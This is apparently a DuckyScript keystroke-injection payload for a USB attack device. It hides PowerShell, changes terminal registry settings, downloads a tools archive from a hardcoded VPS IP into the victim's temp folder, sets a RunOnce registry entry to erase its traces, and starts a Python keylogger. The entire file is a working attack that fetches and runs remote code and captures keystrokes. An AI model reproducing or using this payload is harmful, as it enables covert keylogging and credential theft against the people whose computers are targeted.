REM Change default terminal from wt to powershell
GUI r
DELAY 300
STRINGLN powershell -c "Set-ItemProperty -Path "HKCU:\Console\%%Startup" -Name "DelegationConsole" -Type String -Value '\"\"';Set-ItemProperty -Path "HKCU:\Console\%%Startup" -Name "DelegationTerminal" -Type String -Value '\"\"'"
DELAY 2000

REM Launch powershell in hidden mode
GUI r
DELAY 300
STRINGLN powershell -nop -noni -w h
DELAY 2000

REM Some constants
STRINGLN $zippedTools = "$env:TEMP\tools.zip"
STRINGLN $zippedTools = "$env:TEMP\tools.zip"
REM Doubled to avoid cases where the terminal wasn't moved from wt
STRINGLN $tools = "$env:TEMP\tools"

REM Remove progress bar (saves time)
STRINGLN $ProgressPreference = 'SilentlyContinue'

REM Download tools from VPS to victim's temp folder
STRINGLN IWR -Uri "http://107.189.21.156:26954/tools.zip" -OutFile "$zippedTools"

REM Extract the tools and remove the archive
STRINGLN Expand-Archive -Path "$zippedTools" -DestinationPath "$tools"
STRINGLN Remove-Item "$zippedTools"

REM Implement a self-destruct protocol to delete all traces upon logout/reboot/shutdown
STRINGLN $deleteCommand = "powershell -w h -c `"Remove-Item -Path '$tools' -Recurse -Force`""
STRINGLN Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "VOID" -Value $deleteCommand

REM Send a visual cue to remove the key and start the keylogger immediately
STRINGLN Add-Type -AssemblyName System.Windows.Forms; (New-Object Windows.Forms.Form).Show(); Start-Sleep -m 300; [Windows.Forms.Application]::Exit(); & "$tools\python.exe" "$tools\sender.py"
